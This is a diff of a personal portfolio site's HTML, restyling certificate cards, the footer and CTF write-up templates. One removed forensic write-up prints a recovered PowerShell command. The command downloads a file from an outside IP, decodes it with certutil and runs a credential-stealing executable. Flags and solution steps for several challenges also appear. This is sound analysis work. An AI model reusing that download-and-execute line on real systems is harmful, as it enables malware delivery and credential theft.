+                        <h4 class="cert-title" data-i18n="cert_honor_fall23">Honorable Student</h4>
+                        <p class="cert-issuer">Fall 2023</p>
+                        <p class="cert-org">FPT University</p>
                     </div>
 
-                    <!-- Honorable Fall 2024 -->
-                    <div class="glass-card rounded-xl p-6 text-center card-hover cursor-pointer certificate-card"
+                    <div class="card cert-card"
                         data-pdf="https://raw.githubusercontent.com/Matth3wV0/Certificates/main/Honorable%20Student%20of%20Trimester_Fall%202024.pdf">
-                        <div
-                            class="w-16 h-16 mx-auto mb-4 rounded-full bg-gradient-to-br from-yellow-500/20 to-orange-500/20 flex items-center justify-center">
-                            <i data-lucide="award" class="w-8 h-8 text-yellow-400"></i>
-                        </div>
-                        <h3 class="text-lg font-bold mb-2" data-i18n="cert_honor_fall24_title">Honorable Student (Fall
-                            2024)</h3>
-                        <p class="text-gray-500 text-sm" data-i18n="cert_honor_fall24_desc">Academic Excellence Award
-                        </p>
-                        <div class="mt-4 pt-4 border-t border-white/5">
-                            <span class="text-xs font-mono text-gray-600">UNIVERSITY</span>
-                        </div>
+                        <div class="cert-icon yellow"><i data-lucide="star"></i></div>
+                        <h4 class="cert-title" data-i18n="cert_honor_fall24">Honorable Student</h4>
+                        <p class="cert-issuer">Fall 2024</p>
+                        <p class="cert-org">FPT University</p>
                     </div>
 
-                    <!-- Honorable Spring 2025 -->
-                    <div class="glass-card rounded-xl p-6 text-center card-hover cursor-pointer certificate-card"
+                    <div class="card cert-card"
                         data-pdf="https://raw.githubusercontent.com/Matth3wV0/Certificates/main/Honorable%20Student%20of%20Trimester_Spring%202025.pdf">
-                        <div
-                            class="w-16 h-16 mx-auto mb-4 rounded-full bg-gradient-to-br from-yellow-500/20 to-orange-500/20 flex items-center justify-center">
-                            <i data-lucide="award" class="w-8 h-8 text-yellow-400"></i>
-                        </div>
-                        <h3 class="text-lg font-bold mb-2" data-i18n="cert_honor_spring25_title">Honorable Student
-                            (Spring 2025)</h3>
-                        <p class="text-gray-500 text-sm" data-i18n="cert_honor_spring25_desc">Academic Excellence Award
-                        </p>
-                        <div class="mt-4 pt-4 border-t border-white/5">
-                            <span class="text-xs font-mono text-gray-600">UNIVERSITY</span>
-                        </div>
+                        <div class="cert-icon yellow"><i data-lucide="star"></i></div>
+                        <h4 class="cert-title" data-i18n="cert_honor_spring25">Honorable Student</h4>
+                        <p class="cert-issuer">Spring 2025</p>
+                        <p class="cert-org">FPT University</p>
                     </div>
-
                 </div>
             </div>
         </section>
-
-        <!-- Footer -->
-        <footer class="py-12 px-6 border-t border-card-border/50">
-            <div class="max-w-6xl mx-auto flex flex-col md:flex-row items-center justify-between gap-6">
-                <div class="text-center md:text-left">
-                    <p class="text-gray-500 text-sm" data-i18n="footer_text">
-                        © 2026 Võ Trọng Đức. Built with precision.
-                    </p>
-                </div>
-                <div class="flex items-center gap-6">
-                    <a href="mailto:votrongduc@example.com" class="text-gray-400 hover:text-white transition-colors">
-                        <i data-lucide="mail" class="w-5 h-5"></i>
-                    </a>
-                    <a href="https://github.com/Matth3wV0" target="_blank" rel="noopener"
-                        class="text-gray-400 hover:text-white transition-colors">
-                        <i data-lucide="github" class="w-5 h-5"></i>
-                    </a>
-                    <a href="https://linkedin.com/in/votrongduc" target="_blank" rel="noopener"
-                        class="text-gray-400 hover:text-white transition-colors">
-                        <i data-lucide="linkedin" class="w-5 h-5"></i>
-                    </a>
-                </div>
-            </div>
-        </footer>
-
     </main>
 
-    <!-- Centered Modal -->
-    <div id="modal" class="modal fixed inset-0 z-50 flex items-center justify-center p-4 md:p-8">
-        <div class="absolute inset-0 bg-black/70 backdrop-blur-sm" id="modal-overlay"></div>
-        <div
-            class="modal-content relative w-full max-w-4xl max-h-[90vh] bg-deep-space/95 backdrop-blur-xl border border-card-border rounded-2xl overflow-hidden">
-            <!-- Modal Header -->
-            <div
-                class="sticky top-0 bg-deep-space/90 backdrop-blur-md border-b border-card-border px-6 py-4 flex items-center justify-between">
-                <h2 id="modal-title" class="text-xl md:text-2xl font-bold">Write-up Title</h2>
-                <button id="modal-close" class="p-2 hover:bg-card rounded-lg transition-colors">
-                    <i data-lucide="x" class="w-6 h-6"></i>
-                </button>
+    <!-- Footer -->
+    <footer class="footer">
+        <div class="container footer-inner">
+            <p class="footer-text">© 2025 Võ Trọng Đức. <span data-i18n="footer_rights">All rights reserved.</span></p>
+            <div class="footer-links">
+                <a href="mailto:votrongduc0811@gmail.com" class="social-icon"><i data-lucide="mail"></i></a>
+                <a href="https://github.com/Matth3wV0" target="_blank" rel="noopener" class="social-icon"><i
+                        data-lucide="github"></i></a>
+                <a href="https://linkedin.com/in/votrongduc" target="_blank" rel="noopener" class="social-icon"><i
+                        data-lucide="linkedin"></i></a>
             </div>
-            <!-- Modal Body -->
-            <div id="modal-content" class="p-6 md:p-8 overflow-y-auto max-h-[calc(90vh-80px)]">
-                <!-- Dynamic content loaded here -->
+        </div>
+    </footer>
+
+    <!-- Modal -->
+    <div class="modal" id="modal">
+        <div class="modal-overlay" id="modal-overlay"></div>
+        <div class="modal-content">
+            <div class="modal-header">
+                <h3 class="modal-title" id="modal-title">Title</h3>
+                <button class="modal-close" id="modal-close"><i data-lucide="x"></i></button>
             </div>
+            <div class="modal-body" id="modal-content"></div>
         </div>
     </div>
 
-    <!-- Image Viewer Lightbox -->
-    <div id="lightbox"
-        class="lightbox fixed inset-0 z-[60] flex items-center justify-center p-4 bg-black/90 backdrop-blur-md">
-        <button id="lightbox-close"
-            class="absolute top-4 right-4 p-3 rounded-full bg-white/10 hover:bg-white/20 transition-colors text-white z-10">
-            <i data-lucide="x" class="w-6 h-6"></i>
-        </button>
-        <img id="lightbox-img" class="lightbox-img rounded-lg" src="" alt="Enlarged view">
+    <!-- Lightbox -->
+    <div class="lightbox" id="lightbox">
+        <button class="lightbox-close" id="lightbox-close"><i data-lucide="x"></i></button>
+        <img class="lightbox-img" id="lightbox-img" src="" alt="Zoomed image">
     </div>
 
-    <!-- Write-up Content Templates (Hidden) -->
-    <template id="writeup-gimme-your-point">
-        <div class="grid grid-cols-1 lg:grid-cols-3 gap-8">
-            <!-- Main Content -->
-            <div class="lg:col-span-2 space-y-6">
-                <div class="flex items-center gap-3">
-                    <span class="px-3 py-1 text-xs font-mono bg-red-500/10 text-red-400 rounded">1000 pts</span>
-                    <span class="px-3 py-1 text-xs font-mono bg-purple-500/10 text-purple-400 rounded">Forensic</span>
-                    <span
-                        class="px-3 py-1 text-xs font-mono bg-blue-500/10 text-blue-400 rounded">VCSPassport2025</span>
-                </div>
-
-                <div>
-                    <h3 class="text-lg font-semibold text-emerald-accent mb-3">📋 <span
-                            data-i18n="wu_challenge">Challenge</span></h3>
-                    <p class="text-gray-400 leading-relaxed" data-i18n="gyp_challenge_desc">
-                        "Sniff sniff this traffic to get your POINT but do not SHARE it!!!" - A PCAP file containing
-                        network traffic that conceals a sophisticated SharePoint exploitation attempt leveraging
-                        CVE-2025-49704 deserialization vulnerability.
-                    </p>
-                    <img src="assets/img/vcs-passport/image1.png" alt="Challenge Banner"
-                        class="rounded-xl mt-4 w-full border border-white/10" />
-                </div>
-
-                <div>
-                    <h3 class="text-lg font-semibold text-emerald-accent mb-3">🔍 <span data-i18n="wu_phase1">Phase
-                            1</span>: <span data-i18n="gyp_phase1_title">Traffic Analysis</span></h3>
-                    <p class="text-gray-400 leading-relaxed mb-4" data-i18n="gyp_phase1_desc">
-                        Initial analysis in Wireshark revealed suspicious HTTP requests to <code
-                            class="text-emerald-accent">start.aspx</code>
-                        and <code class="text-emerald-accent">ToolPane.aspx</code>. Using Export HTTP Objects, I
-                        extracted several files
-                        including a suspicious parameter named <code
-                            class="text-emerald-accent">CompressedDataTable</code> containing
-                        a large base64-encoded string.
-                    </p>
-                    <pre class="rounded-xl overflow-hidden text-sm"><code class="language-python"># Decompressing the payload
-import gzip, base64
-
-b64_data = "..." # CompressedDataTable value
-decoded = base64.b64decode(b64_data)
-payload = gzip.decompress(decoded)
-print(payload)  # Reveals XML with embedded PowerShell command</code></pre>
-                    <div class="grid grid-cols-2 gap-3 mt-4">
-                        <img src="assets/img/vcs-passport/image4.png" alt="Export HTTP Objects"
-                            class="rounded-lg border border-white/10" />
-                        <img src="assets/img/vcs-passport/image7.png" alt="CyberChef Decode"
-                            class="rounded-lg border border-white/10" />
-                    </div>
-                </div>
-
-                <div>
-                    <h3 class="text-lg font-semibold text-emerald-accent mb-3">🔍 <span data-i18n="wu_phase2">Phase
-                            2</span>: <span data-i18n="gyp_phase2_title">Vulnerability Research</span></h3>
-                    <p class="text-gray-400 leading-relaxed" data-i18n="gyp_phase2_desc">
-                        Searching for "CompressedDataTable" led to VCS research on
-                        <strong class="text-white">ToolShell – SharePoint vulnerability chain</strong>. This attack
-                        embeds
-                        deserialization payloads (XML/.NET serialized objects) into the <code
-                            class="text-emerald-accent">MSOTlPn_DWP</code>
-                        parameter of a POST request, exploiting CVE-2025-49704.
-                    </p>
-                </div>
-
-                <div>
-                    <h3 class="text-lg font-semibold text-emerald-accent mb-3">💀 <span data-i18n="wu_phase3">Phase
-                            3</span>: <span data-i18n="gyp_phase3_title">Malware Execution Chain</span></h3>
-                    <p class="text-gray-400 leading-relaxed mb-4" data-i18n="gyp_phase3_desc">
-                        The decoded payload contains a staged PowerShell command that downloads
-                        <code class="text-emerald-accent">raw_package</code>, decodes it twice using certutil,
-                        and executes the final <code class="text-emerald-accent">health_check.exe</code> malware.
-                    </p>
-                    <pre class="rounded-xl overflow-hidden text-sm"><code class="language-bash"># Extracted PowerShell command
-powershell -c "Invoke-WebRequest -Uri http://30.243.67.128:1234/raw_package \
-  -OutFile C:\Windows\Temp\raw_package; \
-  certutil -decode raw_package d1; \
-  certutil -decode d1 health_check.exe; \
-  del raw_package; del d1; \
-  health_check.exe; sleep 10; del health_check.exe"</code></pre>
-                    <img src="assets/img/vcs-passport/image6.png" alt="Python Decode Script"
-                        class="rounded-xl mt-4 w-full border border-white/10" />
-                </div>
-
-                <div>
-                    <h3 class="text-lg font-semibold text-emerald-accent mb-3">🔬 <span data-i18n="wu_phase4">Phase
-                            4</span>: <span data-i18n="gyp_phase4_title">Binary Reverse Engineering</span>
-                    </h3>
-                    <p class="text-gray-400 leading-relaxed mb-4" data-i18n="gyp_phase4_desc">
-                        Running the malware created a password-protected ZIP in %TEMP% containing Chrome credential
-                        files.
-                        Using IDA Pro, I found three functions: <code class="text-emerald-accent">GenPass1</code>,
-                        <code class="text-emerald-accent">GenPass2</code>, <code
-                            class="text-emerald-accent">GenPass3</code>
-                        that generated the ZIP password.
-                    </p>
-                    <pre class="rounded-xl overflow-hidden text-sm"><code class="language-python"># Password fragments found in IDA
-# GenPass1: "uP3r"
-# GenPass2: "S3(Ret" 
-# GenPass3: "p4$$w0rd"
-# Combined: "sup3r_S3(ReT_p4$$w0rd"</code></pre>
-                    <img src="assets/img/vcs-passport/image18.png" alt="IDA Pro Analysis"
-                        class="rounded-xl mt-4 w-full border border-white/10" />
-                </div>
-            </div>
-
-            <!-- Sidebar -->
-            <div class="space-y-6">
-                <div class="glass-card rounded-xl p-5">
-                    <h3 class="text-lg font-semibold text-emerald-accent mb-3">🎯 <span
-                            data-i18n="wu_attack_chain">Attack Chain</span></h3>
-                    <ul class="text-gray-400 space-y-2 text-sm">
-                        <li class="flex items-start gap-2">
-                            <span class="text-emerald-accent font-mono">1.</span>
-                            <span data-i18n="gyp_chain_1">SharePoint deserialization via CompressedDataTable</span>
-                        </li>
-                        <li class="flex items-start gap-2">
-                            <span class="text-emerald-accent font-mono">2.</span>
-                            <span data-i18n="gyp_chain_2">PowerShell payload execution</span>
-                        </li>
-                        <li class="flex items-start gap-2">
-                            <span class="text-emerald-accent font-mono">3.</span>
-                            <span data-i18n="gyp_chain_3">Credential stealer deployment</span>
-                        </li>
-                        <li class="flex items-start gap-2">
-                            <span class="text-emerald-accent font-mono">4.</span>
-                            <span data-i18n="gyp_chain_4">Data exfiltration via HTTP POST</span>
-                        </li>
-                    </ul>
-                </div>
-
-                <div
-                    class="bg-gradient-to-br from-emerald-accent/20 to-blue-accent/20 rounded-xl p-5 border border-emerald-accent/30">
-                    <h3 class="text-lg font-semibold text-emerald-accent mb-2">🚩 <span data-i18n="wu_flag">Flag</span>
-                    </h3>
-                    <code class="font-mono text-emerald-accent text-sm break-all">VCSPassport{SH4R3_y0R_P$$wD}</code>
-                </div>
-
-                <div class="glass-card rounded-xl p-5">
-                    <h3 class="text-sm font-semibold text-gray-400 mb-3" data-i18n="wu_tools">Tools Used</h3>
-                    <div class="flex flex-wrap gap-2">
-                        <span class="px-2 py-1 text-xs font-mono bg-white/5 rounded text-gray-400">Wireshark</span>
-                        <span class="px-2 py-1 text-xs font-mono bg-white/5 rounded text-gray-400">IDA Pro</span>
-                        <span class="px-2 py-1 text-xs font-mono bg-white/5 rounded text-gray-400">Python</span>
-                        <span class="px-2 py-1 text-xs font-mono bg-white/5 rounded text-gray-400">CyberChef</span>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </template>
-
-    <template id="writeup-for2-icmp">
-        <div class="grid grid-cols-1 lg:grid-cols-3 gap-8">
-            <!-- Main Content -->
-            <div class="lg:col-span-2 space-y-6">
-                <div class="flex items-center gap-3">
-                    <span class="px-3 py-1 text-xs font-mono bg-yellow-500/10 text-yellow-400 rounded">Medium</span>
-                    <span class="px-3 py-1 text-xs font-mono bg-purple-500/10 text-purple-400 rounded">Forensic</span>
-                </div>
-
-                <div>
-                    <h3 class="text-lg font-semibold text-emerald-accent mb-3">📋 <span
-                            data-i18n="wu_challenge">Challenge</span></h3>
-                    <p class="text-gray-400 leading-relaxed" data-i18n="for2_challenge_desc">
-                        Analyze a PCAPNG file containing network traffic along with an attacker's backdoor binary
-                        (<code class="text-emerald-accent">oci.bin</code>). The goal is to identify the C2 communication
-                        channel and extract the hidden flag.
-                    </p>
-                </div>
-
-                <div>
-                    <h3 class="text-lg font-semibold text-emerald-accent mb-3">🔍 <span data-i18n="wu_phase1">Phase
-                            1</span>: <span data-i18n="for2_phase1_title">Traffic Analysis</span></h3>
-                    <p class="text-gray-400 leading-relaxed mb-4" data-i18n="for2_phase1_desc">
-                        Filtering by protocol in Wireshark revealed suspicious ICMP Request and Reply packets.
-                        One packet contained a command string indicating file download activity from the victim machine.
-                    </p>
-                    <pre class="rounded-xl overflow-hidden text-sm"><code class="language-bash"># ICMP Payload discovered
-download C:\tmp\flag_1s_ck4mpj0n.txt
-
-# Subsequent TCP packet shows success message
-"openfile on remote computers success"
-"The length of the data is 36"</code></pre>
-                    <img src="assets/img/vcs-ctf/image1.png" alt="ICMP Traffic Analysis"
-                        class="rounded-xl mt-4 w-full border border-white/10" />
-                </div>
-
-                <div>
-                    <h3 class="text-lg font-semibold text-emerald-accent mb-3">📤 <span data-i18n="wu_phase2">Phase
-                            2</span>: <span data-i18n="for2_phase2_title">Data Extraction</span></h3>
-                    <p class="text-gray-400 leading-relaxed mb-4" data-i18n="for2_phase2_desc">
-                        The actual flag data was transmitted character by character via ICMP packet payloads.
-                        By extracting and converting the hex data from these packets, the flag was reconstructed.
-                    </p>
-                    <pre class="rounded-xl overflow-hidden text-sm"><code class="language-python"># Hex data from ICMP payloads
-hex_data = "56 43 53 7b 49 5f 41 4d 5f 4c 4f 53 45 52 7d"
-
-# Convert to ASCII
-flag = bytes.fromhex(hex_data.replace(" ", "")).decode()
-print(flag)  # VCS{I_AM_LOSER}</code></pre>
-                    <img src="assets/img/vcs-ctf/image6.png" alt="Flag Extraction"
-                        class="rounded-xl mt-4 w-full border border-white/10" />
-                </div>
-            </div>
-
-            <!-- Sidebar -->
-            <div class="space-y-6">
-                <div class="glass-card rounded-xl p-5">
-                    <h3 class="text-lg font-semibold text-emerald-accent mb-3">⚠️ <span
-                            data-i18n="wu_detection">Detection Indicators</span></h3>
-                    <ul class="text-gray-400 space-y-2 text-sm">
-                        <li class="flex items-start gap-2">
-                            <i data-lucide="alert-triangle" class="w-4 h-4 text-yellow-400 mt-0.5 flex-shrink-0"></i>
-                            <span data-i18n="for2_detect_1">ICMP packets with ASCII data in payload</span>
-                        </li>
-                        <li class="flex items-start gap-2">
-                            <i data-lucide="alert-triangle" class="w-4 h-4 text-yellow-400 mt-0.5 flex-shrink-0"></i>
-                            <span data-i18n="for2_detect_2">Unusual file path references in traffic</span>
-                        </li>
-                        <li class="flex items-start gap-2">
-                            <i data-lucide="alert-triangle" class="w-4 h-4 text-yellow-400 mt-0.5 flex-shrink-0"></i>
-                            <span data-i18n="for2_detect_3">Sequential data exfiltration pattern</span>
-                        </li>
-                    </ul>
-                </div>
-
-                <div
-                    class="bg-gradient-to-br from-emerald-accent/20 to-blue-accent/20 rounded-xl p-5 border border-emerald-accent/30">
-                    <h3 class="text-lg font-semibold text-emerald-accent mb-2">🚩 <span data-i18n="wu_flag">Flag</span>
-                    </h3>
-                    <code class="font-mono text-emerald-accent text-sm break-all">VCS{I_AM_LOSER}</code>
-                </div>
-
-                <div class="glass-card rounded-xl p-5">
-                    <h3 class="text-sm font-semibold text-gray-400 mb-3" data-i18n="wu_tools">Tools Used</h3>
-                    <div class="flex flex-wrap gap-2">
-                        <span class="px-2 py-1 text-xs font-mono bg-white/5 rounded text-gray-400">Wireshark</span>
-                        <span class="px-2 py-1 text-xs font-mono bg-white/5 rounded text-gray-400">Python</span>
-                        <span class="px-2 py-1 text-xs font-mono bg-white/5 rounded text-gray-400">Hex Editor</span>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </template>
-
-    <template id="writeup-re02-macro">
-        <div class="grid grid-cols-1 lg:grid-cols-3 gap-8">
-            <!-- Main Content -->
-            <div class="lg:col-span-2 space-y-6">
-                <div class="flex items-center gap-3">
-                    <span class="px-3 py-1 text-xs font-mono bg-yellow-500/10 text-yellow-400 rounded">Medium</span>
-                    <span class="px-3 py-1 text-xs font-mono bg-orange-500/10 text-orange-400 rounded">Reverse</span>
-                </div>
-
-                <div>
-                    <h3 class="text-lg font-semibold text-emerald-accent mb-3">📋 <span
-                            data-i18n="wu_challenge">Challenge</span></h3>
-                    <p class="text-gray-400 leading-relaxed" data-i18n="re02_challenge_desc">
-                        Analyze an Excel file (<code class="text-emerald-accent">RE02.xls</code>) containing an
-                        obfuscated
-                        macro that launches Windows Calculator when executed. The flag is hidden within the
-                        obfuscated macro logic.
-                    </p>
-                    <img src="assets/img/vcs-ctf/image7.png" alt="Excel Challenge"
-                        class="rounded-xl mt-4 w-full border border-white/10" />
-                </div>
-
-                <div>
-                    <h3 class="text-lg font-semibold text-emerald-accent mb-3">🔍 <span data-i18n="wu_phase1">Phase
-                            1</span>: <span data-i18n="re02_phase1_title">Initial Discovery</span></h3>
-                    <p class="text-gray-400 leading-relaxed mb-4" data-i18n="re02_phase1_desc">
-                        Running the <code class="text-emerald-accent">strings</code> command revealed a suspicious hint:
-                    </p>
-                    <pre class="rounded-xl overflow-hidden text-sm"><code class="language-bash"># Hint found in strings output
-"reverse string in B128 + D70 + reverse string in E178"</code></pre>
-                </div>
-
-                <div>
-                    <h3 class="text-lg font-semibold text-emerald-accent mb-3">🔬 <span data-i18n="wu_phase2">Phase
-                            2</span>: <span data-i18n="re02_phase2_title">Deep Analysis with olevba</span></h3>
-                    <p class="text-gray-400 leading-relaxed mb-4" data-i18n="re02_phase2_desc">
-                        Using the <code class="text-emerald-accent">olevba</code> tool from oletools suite to extract
-                        and analyze the XLM macro, the exact cell values were identified:
-                    </p>
-                    <pre class="rounded-xl overflow-hidden text-sm"><code class="language-bash"># Cell values extracted by olevba
-CELL: B128 -> "(SCV"      # reversed: "VCS("
-CELL: D70  -> "_MY_SUPERPOWER"
-CELL: E178 -> "}HCIR_SI_" # reversed: "_IS_RICH)"
-
-# Combining: VCS( + _MY_SUPERPOWER + _IS_RICH)
-# Note: Use "SUPERPOWER" not "SUPERPOWERS"</code></pre>
-                    <img src="assets/img/vcs-ctf/image8.png" alt="Macro Analysis"
-                        class="rounded-xl mt-4 w-full border border-white/10" />
-                </div>
-
-                <div>
-                    <h3 class="text-lg font-semibold text-emerald-accent mb-3">🧩 <span data-i18n="wu_phase3">Phase
-                            3</span>: <span data-i18n="re02_phase3_title">Solution</span></h3>
-                    <p class="text-gray-400 leading-relaxed" data-i18n="re02_phase3_desc">
-                        The key insight was that the strings in cells B128 and E178 needed to be reversed,
-                        while D70 was used as-is. After adjusting for the correct spelling (without the extra 'S'),
-                        the flag was assembled: <code class="text-emerald-accent">VCS{MY_SUPERPOWER_IS_RICH}</code>
-                    </p>
-                    <img src="assets/img/vcs-ctf/image9.png" alt="Flag Result"
-                        class="rounded-xl mt-4 w-full border border-white/10" />
-                </div>
-            </div>
-
-            <!-- Sidebar -->
-            <div class="space-y-6">
-                <div class="glass-card rounded-xl p-5">
-                    <h3 class="text-lg font-semibold text-emerald-accent mb-3">🦠 <span
-                            data-i18n="wu_obfuscation">Obfuscation Techniques</span></h3>
-                    <ul class="text-gray-400 space-y-2 text-sm">
-                        <li class="flex items-start gap-2">
-                            <i data-lucide="shuffle" class="w-4 h-4 text-orange-400 mt-0.5 flex-shrink-0"></i>
-                            <span data-i18n="re02_obf_1">String reversal in specific cells</span>
-                        </li>
-                        <li class="flex items-start gap-2">
-                            <i data-lucide="grid" class="w-4 h-4 text-orange-400 mt-0.5 flex-shrink-0"></i>
-                            <span data-i18n="re02_obf_2">Data split across multiple cells</span>
-                        </li>
-                        <li class="flex items-start gap-2">
-                            <i data-lucide="eye-off" class="w-4 h-4 text-orange-400 mt-0.5 flex-shrink-0"></i>
-                            <span data-i18n="re02_obf_3">Hidden hint in file metadata</span>
-                        </li>
-                    </ul>
-                </div>
-
-                <div
-                    class="bg-gradient-to-br from-emerald-accent/20 to-blue-accent/20 rounded-xl p-5 border border-emerald-accent/30">
-                    <h3 class="text-lg font-semibold text-emerald-accent mb-2">🚩 <span data-i18n="wu_flag">Flag</span>
-                    </h3>
-                    <code class="font-mono text-emerald-accent text-sm break-all">VCS{MY_SUPERPOWER_IS_RICH}</code>
-                </div>
-
-                <div class="glass-card rounded-xl p-5">
-                    <h3 class="text-sm font-semibold text-gray-400 mb-3" data-i18n="wu_tools">Tools Used</h3>
-                    <div class="flex flex-wrap gap-2">
-                        <span class="px-2 py-1 text-xs font-mono bg-white/5 rounded text-gray-400">olevba</span>
-                        <span class="px-2 py-1 text-xs font-mono bg-white/5 rounded text-gray-400">oletools</span>
-                        <span class="px-2 py-1 text-xs font-mono bg-white/5 rounded text-gray-400">strings</span>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </template>
-
+    <!-- CTF Write-up Templates (hidden) -->
     <template id="writeup-ezlogic">
-        <div class="grid grid-cols-1 lg:grid-cols-3 gap-8">
-            <div class="lg:col-span-2 space-y-6">
-                <div>
-                    <h3 class="text-lg font-semibold text-emerald-accent mb-3">📋 <span
-                            data-i18n="wu_challenge">Challenge</span></h3>
-                    <p class="text-gray-400 leading-relaxed" data-i18n="ezlogic_desc">
-                        Analyzing and decoding a hardware logic system described in schematic.pdf. The challenge
-                        involves understanding Verilog code and signal timing to uncover the flag.
-                    </p>
-                    <img src="assets/img/ctf_dl/ezlogic/5c0d4364-f1d4-492c-8947-cd672b0a5f88.png" alt="Schematic"
-                        class="rounded-xl mt-4 w-full border border-white/10" />
-                </div>
-                <div>
-                    <h3 class="text-lg font-semibold text-emerald-accent mb-3">🔍 <span data-i18n="wu_phase1">Phase
-                            1</span>: <span data-i18n="ezlogic_phase1_title">Signal Analysis</span></h3>
-                    <p class="text-gray-400 leading-relaxed mb-4" data-i18n="ezlogic_phase1_desc">
-                        Examining `EzLogic_tb.vcd` showed that `data_out_all` changes over time, but `success` remains
-                        0. The goal is to make `success=1`.
-                    </p>
-                    <div class="grid grid-cols-2 gap-3 mt-4">
-                        <img src="assets/img/ctf_dl/ezlogic/f328be2e-3197-4863-bfd3-02f67e1090dc.png" alt="Waveform 1"
-                            class="rounded-lg border border-white/10" />
-                        <img src="assets/img/ctf_dl/ezlogic/6552cef5-ee8f-4a64-8e0a-b6fad5c3ea52.png" alt="Waveform 2"
-                            class="rounded-lg border border-white/10" />
-                    </div>
-                </div>
-                <div>
-                    <h3 class="text-lg font-semibold text-emerald-accent mb-3">💻 <span data-i18n="wu_phase2">Phase
-                            2</span>: <span data-i18n="ezlogic_phase2_title">Brute Force Attack</span></h3>
-                    <p class="text-gray-400 leading-relaxed mb-4" data-i18n="ezlogic_phase2_desc">
-                        The comparison logic revealed that each character is encoded individually. I wrote a Python
-                        script wrapping `iverilog` to brute-force the flag character by character.
-                    </p>
-                    <pre class="rounded-xl overflow-hidden text-sm"><code class="language-python"># Brute force snippet
-def brute_force_character(position):
-    for char in characters:
-        test_flag = flag_prefix + char + "0" * (flag_length - len(flag_prefix) - 1)
-        update_testbench(test_flag)
-        if check_success(): return char</code></pre>
-                </div>
+        <div class="writeup-content">
+            <div class="writeup-summary">
+                <h4>📋 Executive Summary</h4>
+                <p data-i18n="writeup_ezlogic_summary">Hardware security challenge involving analysis of a custom logic
+                    gate circuit described in Verilog. The challenge required understanding digital logic,
+                    position-based encoding, and character-by-character brute-forcing to recover the flag.</p>
             </div>
-            <div class="space-y-6">
-                <div class="glass-card rounded-xl p-5">
-                    <h3 class="text-lg font-semibold text-emerald-accent mb-3">⚠️ <span data-i18n="wu_tools">Tools
-                            Used</span></h3>
-                    <div class="flex flex-wrap gap-2">
-                        <span class="px-2 py-1 text-xs font-mono bg-white/5 rounded text-gray-400">Verilog</span>
-                        <span class="px-2 py-1 text-xs font-mono bg-white/5 rounded text-gray-400">GTKWave</span>
-                        <span class="px-2 py-1 text-xs font-mono bg-white/5 rounded text-gray-400">Python</span>
-                    </div>
-                </div>
-                <div
-                    class="bg-gradient-to-br from-emerald-accent/20 to-blue-accent/20 rounded-xl p-5 border border-emerald-accent/30">
-                    <h3 class="text-lg font-semibold text-emerald-accent mb-2">🚩 <span data-i18n="wu_flag">Flag</span>
-                    </h3>
-                    <code
-                        class="font-mono text-emerald-accent text-sm break-all">0ops{aadc337c-b5a0-4ff0-ad94-9d1cf41956f4}</code>
-                </div>
+
+            <div class="writeup-mitre">
+                <h4>🎯 MITRE ATT&CK Mapping</h4>
+                <table class="mitre-table">
+                    <tr>
+                        <th>Technique ID</th>
+                        <th>Name</th>
+                        <th>Description</th>
+                    </tr>
+                    <tr>
+                        <td><code>T1027</code></td>
+                        <td>Obfuscated Files or Information</td>
+                        <td>Custom logic encoding</td>
+                    </tr>
+                    <tr>
+                        <td><code>T1140</code></td>
+                        <td>Deobfuscate/Decode</td>
+                        <td>Position-based decryption</td>
+                    </tr>
+                </table>
             </div>
+
+            <h4>🔍 Technical Analysis</h4>
+            <p data-i18n="writeup_ezlogic_intro">Analyzing and decoding a hardware logic system described in
+                <code>schematic.pdf</code>.
+            </p>
+            <img src="assets/img/ctf_dl/ezlogic/5c0d4364-f1d4-492c-8947-cd672b0a5f88.png"
+                alt="EzLogic schematic analysis">
+
+            <p data-i18n="writeup_ezlogic_vcd">Based on the information from <code>EzLogic_tb.vcd</code>, we can observe
+                that <code>data_out_all</code> changes over time, and the variable <code>success=0</code>. If the
+                <code>success</code> variable becomes <code>1</code>, we might be able to find the flag.
+            </p>
+            <img src="assets/img/ctf_dl/ezlogic/f328be2e-3197-4863-bfd3-02f67e1090dc.png" alt="VCD analysis 1">
+            <img src="assets/img/ctf_dl/ezlogic/6552cef5-ee8f-4a64-8e0a-b6fad5c3ea52.png" alt="VCD analysis 2">
+
+            <h4>💡 The Breakthrough</h4>
+            <p data-i18n="writeup_ezlogic_discovery">After replacing the value of <code>FLAG_TO_TEST</code> with
+                <code>"0ops{....."</code>, I noticed that the first 10 bytes of <code>data_out_all</code> matched with
+                <code>data_std</code>. This indicates that the program encodes each character individually, and the
+                encoding varies depending on the position.
+            </p>
+            <img src="assets/img/ctf_dl/ezlogic/a1e3f630-821c-47de-84c5-f29d0a054352.png" alt="Flag prefix discovery">
+
+            <p data-i18n="writeup_ezlogic_bruteforce">I came up with the idea of using brute force to find the flag by
+                replacing each character of the flag sequentially and comparing the corresponding byte at that position
+                in <code>data_std</code>.</p>
+
+            <pre><code class="language-python">def brute_force_flag():
+    current_flag = flag_prefix  # Start with the known prefix
+    data_std = ["30", "78", "9d", "56", ...]  # Expected hex values
+    
+    for i in range(len(flag_prefix), flag_length):
+        for char in characters:
+            test_flag = current_flag + char + "0" * (flag_length - len(current_flag) - 1)
+            update_testbench(test_flag)
+            data_out = get_data_out()
+            
+            if data_out[i] == data_std[i]:
+                current_flag += char
+                break
+    
+    print(f"Final flag: {current_flag}")</code></pre>
+
+            <p data-i18n="writeup_ezlogic_result">After running the brute-force program, we were able to find the flag.
+            </p>
+            <img src="assets/img/ctf_dl/ezlogic/48547161-02b8-4d81-b9b5-27b62425cb3c.png" alt="Flag found">
+
+            <div class="writeup-detection">
+                <h4>🛡️ Detection Strategy (Blue Team)</h4>
+                <ul>
+                    <li>Monitor for automated Verilog testbench modifications</li>
+                    <li>Detect brute-force patterns in simulation outputs</li>
+                    <li>Log VCD file access patterns for anomaly detection</li>
+                </ul>
+            </div>
+
+            <blockquote><strong>Flag:</strong> 0ops{aadc337c-b5a0-4ff0-ad94-9d1cf41956f4}</blockquote>
         </div>
     </template>
 
     <template id="writeup-easy-forensics">
-        <div class="grid grid-cols-1 lg:grid-cols-3 gap-8">
-            <div class="lg:col-span-2 space-y-6">
-                <div>
-                    <h3 class="text-lg font-semibold text-emerald-accent mb-3">📋 <span
-                            data-i18n="wu_challenge">Challenge</span></h3>
-                    <p class="text-gray-400 leading-relaxed" data-i18n="easyforensics_desc">
-                        Given a Memory.raw file, we need to find the password to extract the flag from Gift.rar.
-                    </p>
-                </div>
-                <div>
